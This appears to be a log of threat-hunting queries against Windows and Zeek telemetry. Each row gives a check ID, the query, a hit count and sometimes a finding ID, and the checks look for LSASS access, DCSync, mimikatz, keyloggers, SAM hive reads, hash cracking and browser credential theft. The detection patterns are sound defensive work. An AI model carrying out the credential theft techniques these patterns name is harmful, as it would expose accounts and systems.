| q-e29dddc0e8 | check C037 | search | {"dataset": "windows.security", "query": "event.code:4663 AND win.ObjectName:(*SECURITY*Cache*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "proc… | 0 |  |
| q-49eb9e6e12 | check C038 | search | {"dataset": "windows.security", "query": "event.code:4656 AND win.ObjectName:*Cache*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command… | 0 |  |
| q-f8aed66d2a | check C039 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND win.ScriptBlockText:(*cachedump* OR *cache* OR *dcc2*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "pro… | 0 |  |
| q-03ac071225 | check C040 | search | {"dataset": "windows.other", "query": "event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinat… | 5 |  |
| q-f68a7330a9 | check C041 | count | {"dataset": "windows.security", "query": "event.code:4662", "time_from": null, "time_to": null} | 7 |  |
| q-871a2fa006 | check C042 | aggregate | {"dataset": "windows.security", "field": "win.AccessMask", "query": "event.code:4662", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 7 |  |
| q-311a145621 | check C043 | aggregate | {"dataset": "windows.security", "field": "win.SubjectUserName", "query": "event.code:4662", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 7 |  |
| q-505df81806 | check C044 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-8088a24a5d | check C045 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*drsuapi* OR process.command_line:*dcsync* OR process.command_line:*lsadump*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dat… | 0 |  |
| q-a14a9a2ef5 | check C046 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*DCSync* OR win.ScriptBlockText:*drsuapi* OR win.ScriptBlockText:*lsadump* OR win.ScriptBlockText:*Get-ADReplAccount*)", "time_from": null, "time_to": null, "fields": ["@times… | 0 |  |
| q-5e989184ff | check C047 | search | {"dataset": "windows.other", "query": "message:*drsuapi* OR message:*DCSync*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", … | 0 |  |
| q-57619a786a | check C048 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 460 |  |
| q-b237dc8b00 | check C049 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.command_line:*pktmon* OR process.command_line:*windump* OR process.command_line:*tcpdump* OR process.command_line:*wireshark* OR process.command_line:*netsh*cap*)", "time_from": null, "time… | 1 |  |
| q-f7f8d70d83 | check C050 | search | {"dataset": "windows.other", "query": "event.code:7045 AND (win.ImagePath:*pcap* OR win.ImagePath:*npcap* OR win.ImagePath:*windump* OR win.ImagePath:*pktmon*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.… | 0 |  |
| q-7ad7a62fc1 | check C051 | aggregate | {"dataset": "windows.sysmon", "field": "win.ImageLoaded", "query": "event.code:7 AND (win.ImageLoaded:*pcap* OR win.ImageLoaded:*npcap* OR win.ImageLoaded:*wpcap*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-47c5aa011a | check C052 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*pktmon* OR process.command_line:*windump* OR process.command_line:*tcpdump* OR process.command_line:*wireshark* OR process.command_line:*netsh*cap*)", "time_from": null, "time_to":… | 1 | F08 |
| q-ace627cab0 | check C053 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*pktmon* OR win.ScriptBlockText:*windump* OR win.ScriptBlockText:*tcpdump* OR win.ScriptBlockText:*netsh*cap*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "… | 0 |  |
| q-40a8770d28 | check C054 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 39283 |  |
| q-e679eb5288 | check C055 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-0d77467cdb | check C056 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4656 OR event.code:4663 OR event.code:4670", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 10977 |  |
| q-9482b69d03 | check C057 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4656 OR event.code:4663 OR event.code:4670", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 10977 |  |
| q-1a87f07a1e | check C058 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*GetAsyncKeyState* OR win.ScriptBlockText:*SetWindowsHookEx* OR win.ScriptBlockText:*GetKeyboardState* OR win.ScriptBlockText:*keylog*)", "time_from": null, "time_to": null, "… | 0 |  |
| q-90bf602618 | check C059 | search | {"dataset": "windows.other", "query": "message:*keylog* OR message:*GetAsyncKeyState* OR message:*SetWindowsHookEx*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "proces… | 0 |  |
| q-7ac7dbbc56 | check C060 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 39283 |  |
| q-e11b1e96e8 | check C061 | aggregate | {"dataset": "windows.sysmon", "field": "registry.path", "query": "event.code:13 AND (registry.path:*Keyboard* OR registry.path:*keylog* OR registry.path:*Scancode*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 26 |  |
| q-7ddf4c31f6 | check C062 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*keylog* OR process.command_line:*GetAsyncKeyState* OR process.command_line:*SetWindowsHookEx*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer… | 0 |  |
| q-aaacb6e1c9 | check C063 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4656 OR event.code:4663 OR event.code:4670", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 10977 |  |
| q-193492786e | check C064 | search | {"dataset": "windows.other", "query": "event.code:7045 AND (win.ImagePath:*keylog* OR win.ServiceName:*keylog* OR win.ImagePath:*hook*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", … | 0 |  |
| q-e0f28f326e | check C065 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*GetAsyncKeyState* OR win.ScriptBlockText:*SetWindowsHookEx* OR win.ScriptBlockText:*keylog*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "obse… | 0 |  |
| q-e7d899aa4f | check C066 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*CredentialPrompt* OR win.ScriptBlockText:*Get-Credential* OR win.ScriptBlockText:*PromptForCredential* OR win.ScriptBlockText:*CredUIPromptForCredentials*)", "time_from": nul… | 0 |  |
| q-827332146f | check C067 | aggregate | {"dataset": "windows.powershell", "field": "win.ScriptBlockText", "query": "event.code:4104 AND (win.ScriptBlockText:*Credential* OR win.ScriptBlockText:*Prompt*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 4 |  |
| q-bf456b5ec9 | check C068 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*CredUIPromptForCredentials* OR process.command_line:*Get-Credential* OR process.command_line:*PromptForCredential*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "… | 0 |  |
| q-1897be1c3e | check C069 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 460 |  |
| q-edf98cc221 | check C070 | search | {"dataset": "windows.other", "query": "message:*CredUIPromptForCredentials* OR message:*CredentialPrompt*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executab… | 0 |  |
| q-845e07882d | check C071 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11 AND (win.TargetFilename:*.aspx OR win.TargetFilename:*.ashx OR win.TargetFilename:*.asp OR win.TargetFilename:*.php)", "time_from": null, "time_to": null, "size": 100, "sub_fi… | 0 |  |
| q-6e6428e2b7 | check C072 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (win.TargetFilename:*login* OR win.TargetFilename:*portal* OR win.TargetFilename:*wwwroot*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", … | 0 |  |
| q-b99dc883dc | check C073 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 AND (win.ObjectName:*.aspx OR win.ObjectName:*.asp OR win.ObjectName:*.php OR win.ObjectName:*wwwroot*)", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-145325b568 | check C074 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*wwwroot* OR win.ScriptBlockText:*.aspx* OR win.ScriptBlockText:*login*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.da… | 2 |  |
| q-b68469ef21 | check C075 | search | {"dataset": "windows.other", "query": "message:*wwwroot* OR message:*.aspx* OR message:*login*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "proce… | 0 |  |
| q-7eacf6ee7f | check C076 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-c35c5f100e | check C077 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-64cfae888f | check C078 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-3d08e8f804 | check C079 | aggregate | {"dataset": "windows.sysmon", "field": "win.ImageLoaded", "query": "event.code:7", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 20259 |  |
| q-b75e0a8c3d | check C080 | search | {"dataset": "windows.sysmon", "query": "event.code:8 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_lin… | 2 |  |
| q-966f175569 | check C081 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4656 AND win.ObjectName:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 13 |  |
| q-b133f7cc2a | check C082 | aggregate | {"dataset": "windows.security", "field": "win.AccessMask", "query": "event.code:4663 AND win.ObjectName:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 6 |  |
| q-e3c46723a1 | check C083 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND win.ScriptBlockText:(*lsass* OR *MiniDump* OR *Get-Process*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name"… | 3 |  |
| q-723ed3843c | check C084 | search | {"dataset": "windows.other", "query": "message:(*lsass* OR *MiniDump* OR *procdump*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command… | 0 |  |
| q-59cdc6dcdd | check C085 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-6eb723182f | check C086 | aggregate | {"dataset": "windows.security", "field": "source.ip", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-dd795627fc | check C087 | timeline | {"dataset": "windows.security", "query": "event.code:4625", "interval": "1m", "time_from": null, "time_to": null} | 0 |  |
| q-f7b5fccd30 | check C088 | aggregate | {"dataset": "windows.security", "field": "win.Status", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-52e90fcfde | check C089 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4776", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1 |  |
| q-653a7f7d81 | check C090 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND win.ScriptBlockText:(*Invoke-Command* OR *New-Object* OR *Credential* OR *Password*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "… | 15 |  |
| q-dd5407cbbc | check C091 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*password* OR process.command_line:*pass*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1 |  |
| q-ba23338f9c | check C092 | search | {"dataset": "windows.other", "query": "message:(*logon* OR *password* OR *authentication*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.c… | 4 |  |
| q-822a60da40 | check C093 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-dd6aab839b | check C094 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-6fe8d2a9e1 | check C095 | timeline | {"dataset": "windows.security", "query": "event.code:4625 AND win.TargetUserName:*", "interval": "1m", "time_from": null, "time_to": null} | 0 |  |
| q-7c4c0988ce | check C096 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND win.ScriptBlockText:(*Password* OR *Credential* OR *Login*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name",… | 4 |  |
| q-ed64449af6 | check C097 | aggregate | {"dataset": "windows.sysmon", "field": "process.command_line", "query": "event.code:1 AND (process.command_line:*net use* OR process.command_line:*net.exe*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-ed6cd75980 | check C098 | search | {"dataset": "windows.other", "query": "message:(*logon* OR *password*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "sourc… | 2 |  |
| q-52443ce0a9 | check C099 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*hashcat* OR process.command_line:*john* OR process.command_line:*crack*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-c1d7921222 | check C100 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11 AND (win.TargetFilename:*hash* OR win.TargetFilename:*.potfile* OR win.TargetFilename:*.txt)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 21 |  |
| q-92598f00e8 | check C101 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10 AND (win.TargetImage:*lsass* OR win.TargetImage:*sam*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-b9510aee56 | check C102 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 AND (win.ObjectName:*SAM* OR win.ObjectName:*SECURITY* OR win.ObjectName:*SYSTEM*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 4484 |  |
| q-50a7c08530 | check C103 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4656 AND (win.ObjectName:*SAM* OR win.ObjectName:*SECURITY*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10 |  |
| q-9b1b0a7b4e | check C104 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4670 AND (win.ObjectName:*SAM* OR win.ObjectName:*SECURITY*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-b3534b4e4f | check C105 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND win.ScriptBlockText:(*hashcat* OR *john* OR *ConvertTo-SecureString* OR *NTLM*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event… | 2 |  |
| q-4714b133be | check C106 | search | {"dataset": "windows.other", "query": "message:(*hash* OR *crack* OR *SAM*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "… | 1 |  |
| q-ab753af76c | check C107 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-7e83984ebc | check C108 | aggregate | {"dataset": "windows.security", "field": "source.ip", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-dd16bd06fb | check C109 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4771", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-668f6e37ba | check C110 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4648", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 15 |  |
| q-20a9faed91 | check C111 | timeline | {"dataset": "windows.security", "query": "event.code:4625 OR event.code:4771", "interval": "1m", "time_from": null, "time_to": null} | 0 |  |
| q-f30f2045ef | check C112 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND win.ScriptBlockText:(*foreach* OR *Password* OR *Credential*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name… | 22 |  |
| q-649909e568 | check C113 | aggregate | {"dataset": "windows.sysmon", "field": "process.command_line", "query": "event.code:1 AND (process.command_line:*net use* OR process.command_line:*net.exe*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-8792d95722 | check C114 | search | {"dataset": "windows.other", "query": "message:(*logon* OR *authentication* OR *password*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.c… | 4 |  |
| q-c436829290 | check C115 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 0 |  |
| q-b17f587bed | check C116 | aggregate | {"dataset": "windows.security", "field": "source.ip", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-b9ffa1b42b | check C117 | timeline | {"dataset": "windows.security", "query": "event.code:4625", "interval": "1m", "time_from": null, "time_to": null} | 0 |  |
| q-07849fa0ec | check C118 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-62a2cc7b65 | check C119 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND win.ScriptBlockText:(*Credential* OR *Password* OR *Login*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name",… | 4 |  |
| q-62b4e2694c | check C120 | aggregate | {"dataset": "windows.sysmon", "field": "process.command_line", "query": "event.code:1 AND (process.command_line:*net use* OR process.command_line:*runas*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-a2aef7fdcc | check C121 | search | {"dataset": "windows.other", "query": "message:(*logon* OR *password* OR *authentication*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.c… | 4 |  |
| q-fe8948fabf | check C122 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4624 OR event.code:4648", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 312 |  |
| q-763fec5ec0 | check C123 | aggregate | {"dataset": "windows.security", "field": "win.AuthenticationPackageName", "query": "event.code:4624 OR event.code:4648", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 312 |  |
| q-5ceaebf26b | check C124 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-5fd33dff47 | check C125 | aggregate | {"dataset": "windows.sysmon", "field": "registry.path", "query": "event.code:13 OR event.code:14", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 17541 |  |
| q-b1668f3fe3 | check C126 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*lsass* OR win.ScriptBlockText:*mimikatz* OR win.ScriptBlockText:*sekurlsa* OR win.ScriptBlockText:*credential*)", "time_from": null, "time_to": null, "fields": ["@timestamp",… | 2 |  |
| q-853f31b34b | check C127 | search | {"dataset": "windows.other", "query": "event.code:7045 OR event.code:7040", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "so… | 9 | F17 |
| q-c424326fb8 | check C128 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 OR event.code:4656 OR event.code:4670", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10977 |  |
| q-8dd5be1441 | check C129 | aggregate | {"dataset": "windows.security", "field": "win.ShareName", "query": "event.code:5140 OR event.code:5145", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 163 |  |
| q-3582985a5d | check C130 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1649 |  |
| q-5ac5dc0bb9 | check C131 | aggregate | {"dataset": "windows.sysmon", "field": "destination.ip", "query": "event.code:3 AND (destination.port:139 OR destination.port:445)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 66 |  |
| q-25f35474ec | check C132 | aggregate | {"dataset": "zeek", "field": "destination.port", "query": "event.action:conn AND (destination.port:139 OR destination.port:445)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 50 |  |
| q-2b8f49a963 | check C133 | search | {"dataset": "zeek", "query": "event.action:http AND (http.request.method:PROPFIND OR http.request.method:OPTIONS OR http.request.method:MOVE)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.c… | 36 | F18 |
| q-85267b741b | check C134 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*WebDAV* OR win.ScriptBlockText:*NTLM* OR win.ScriptBlockText:*Responder* OR win.ScriptBlockText:*PetitPotam*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "… | 0 |  |
| q-96f9e2c15a | check C135 | search | {"dataset": "windows.other", "query": "event.code:7045", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "destinat… | 5 |  |
| q-cabe6cb7a1 | check C136 | aggregate | {"dataset": "windows.security", "field": "event.code", "query": "event.code:4768 OR event.code:4769 OR event.code:4770", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 42 |  |
| q-1a0c382668 | check C137 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4768 OR event.code:4769 OR event.code:4770", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 42 |  |
| q-f2b106714e | check C138 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-598a09fc78 | check C139 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 447 |  |
| q-eb5e520027 | check C140 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*Invoke-* OR win.ScriptBlockText:*exploit* OR win.ScriptBlockText:*lsass*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.… | 16 |  |
| q-837febf813 | check C141 | search | {"dataset": "windows.other", "query": "event.code:1 OR event.code:10 OR event.code:11", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.comman… | 10 |  |
| q-639834f7b5 | check C142 | aggregate | {"dataset": "zeek", "field": "destination.port", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 613 |  |
| q-9df4d4777a | check C143 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 460 |  |
| q-f2d934a650 | check C144 | aggregate | {"dataset": "windows.security", "field": "win.TargetName", "query": "event.code:4663 OR event.code:4656", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10834 |  |
| q-79e1f9f01b | check C145 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-677749f997 | check C146 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1649 |  |
| q-7bfce4415a | check C147 | aggregate | {"dataset": "windows.sysmon", "field": "win.Image", "query": "event.code:2", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 209 |  |
| q-d82b690fa3 | check C148 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*Cookies* OR win.ScriptBlockText:*Login Data* OR win.ScriptBlockText:*sqlite*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "ev… | 13 |  |
| q-b9870fa93b | check C149 | search | {"dataset": "windows.other", "query": "event.code:1 OR event.code:11", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.… | 7 |  |
| q-b1d04096f4 | check C150 | search | {"dataset": "zeek", "query": "event.action:http AND (http.request.method:POST OR http.request.method:GET)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executab… | 2 |  |
| q-93c1f46e44 | check C151 | aggregate | {"dataset": "windows.security", "field": "process.executable", "query": "event.code:4688", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 460 |  |
| q-c2b0c4e9a3 | check C152 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 OR event.code:4656", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10834 |  |
| q-88890071e7 | check C153 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1649 |  |
| q-d354cd05fd | check C154 | aggregate | {"dataset": "windows.sysmon", "field": "registry.path", "query": "event.code:13 OR event.code:14", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 17541 |  |
| q-9fb53591a0 | check C155 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*password* OR win.ScriptBlockText:*credential* OR win.ScriptBlockText:*ConvertTo-SecureString*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "ob… | 4 | F22, F23 |
| q-838704db86 | check C156 | search | {"dataset": "windows.other", "query": "event.code:1 OR event.code:11 OR event.code:13", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.comman… | 8 |  |
| q-8ba9c72310 | check C157 | search | {"dataset": "zeek", "query": "event.action:smb_files OR event.action:smb_mapping", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_lin… | 23 |  |
| q-1927d990c0 | check C158 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4624 OR event.code:4648", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 312 |  |
| q-cf437dafa4 | check C159 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4663 OR event.code:4656", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 10834 |  |
| q-f5c97481d6 | check C160 | aggregate | {"dataset": "windows.sysmon", "field": "process.command_line", "query": "event.code:1", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 447 |  |
| q-45ede8b937 | check C161 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetFilename", "query": "event.code:11", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1649 |  |
| q-ed81ff0a1b | check C162 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (win.ScriptBlockText:*Get-Content* OR win.ScriptBlockText:*Select-String* OR win.ScriptBlockText:*password*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.n… | 1 |  |
